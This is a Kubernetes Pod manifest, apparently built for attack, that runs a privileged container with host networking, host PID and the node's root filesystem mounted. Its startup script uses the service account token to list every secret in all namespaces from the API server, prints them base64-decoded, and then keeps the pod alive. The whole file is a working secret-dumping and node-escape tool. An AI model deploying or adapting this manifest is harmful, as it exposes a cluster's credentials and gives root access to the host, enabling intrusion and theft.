apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  serviceAccountName: default
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache curl jq > /dev/null 2>&1

        echo "=== KUBERNETES SECRETS (all namespaces) ==="
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets 2>&1 | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.data | keys | join(","))"' 2>&1 || true

        echo "=== KUBERNETES SECRETS (decoded) ==="
        curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets 2>&1 | jq -r '.items[] | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 || true

        echo "=== DONE ==="
        sleep 36000
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
